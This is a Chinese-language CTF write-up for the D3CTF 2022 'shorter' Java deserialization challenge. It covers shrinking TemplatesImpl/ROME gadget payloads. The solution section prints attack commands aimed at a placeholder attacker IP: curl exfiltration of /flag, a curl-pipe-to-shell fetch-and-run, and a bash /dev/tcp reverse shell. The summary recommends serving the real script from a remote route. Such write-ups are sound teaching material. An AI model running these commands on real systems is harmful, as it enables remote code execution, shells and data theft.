# shorter

## 题目简述

题目是 Java 反序列化场景：服务端接收 Base64 编码后的序列化数据，解码后直接反序列化。主要限制不是找到反序列化入口，而是把基于 `TemplatesImpl` 和 ROME 的 gadget payload 压到足够短。

外部参考 https://xz.aliyun.com/t/10824 的关键价值是说明 `TemplatesImpl` 链的瘦身思路：减少无用字段、压缩字节码和构造参数，并避免通过 `Runtime.getRuntime().exec()` 传复杂 shell 元字符导致 payload 变长。本题在这个思路上继续优化空参构造，并对 ROME 链做简化。

官方附件和 exp 仓库：https://github.com/la0t0ng/d3ctf2022-shorter 。仓库 README 标明题目文件位于 `challenge`，利用脚本位于 `web_shorter`，因此后续复现时重点看这两个目录。

## 解题过程

### 预期解

预期解使用 ysoserial 上已有的链子完成，没有继续寻找 ROME 的其他更短链。

因为Runtime.getRuntime().exec() 对于命令中带有| 、< 、> 等符号时无法正常执行，无法达到我们本来想达到的目的，而我们平时则会通过Base64编码的方式来解决这个问题，但是这无疑使生成的payload变得很长，所以我们可以用ProcessBuilder().start() 来解决这个问题

先用一台有公网IP（假设IP为xxx.xxx.xxx.xxx ）的机子监听一个端口（假设端口为2333 ），再起一个http服务（假设为默认端口80 ）其中路由a 返回的信息为

```
cat /flag | curl -F 'a=@-' xxx.xxx.xxx.xxx:2333
```

可以通过传入命令参数到exp中

```
sh -c "curl xxx.xxx.xxx.xxx/a|sh"
```

将生成的Base64编码后的字符串上传后，即可看到xxx.xxx.xxx.xxx:2333 的监听到了带有flag的文件内容

或者

先用一台有公网IP（假设IP为xxx.xxx.xxx.xxx ）的机子监听一个端口（假设端口为2333 ），再起一个http服务（假设为默认端口80 ）其中路由a 返回的信息为

```
bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1
```

可以通过传入命令参数到exp中

```
bash -c "curl xxx.xxx.xxx.xxx/a|bash"
```

将生成的Base64编码后的字符串上传后，即可看到xxx.xxx.xxx.xxx:2333 获得了反弹的shell

### 非预期

相比于常见的链，有一些更短的ROME 链，比如一条通过BadAttributeValueExpException 触发toString 的链，能大幅减少生成的序列化字符串，反正都是有关于ROME 这条链的缩短，而不是有关TemplateImpl 的缩短，希望师傅们感兴趣的可以去了解一下。

## 方法总结

- 核心技巧：在可控 Java 反序列化入口下，围绕 `TemplatesImpl` / ROME gadget 做 payload 体积压缩，并用 `ProcessBuilder().start()` 处理复杂 shell 命令。
- 识别信号：题目要求上传 Base64 序列化字符串且服务端直接反序列化，同时限制 payload 长度时，应优先考虑 gadget 链瘦身，而不是只换常规 ysoserial payload。
- 复用要点：复杂命令不要直接塞进 `Runtime.exec()`；可以让远端 HTTP 路由返回实际执行脚本，再通过短命令拉取执行，从而减少序列化 payload 长度。
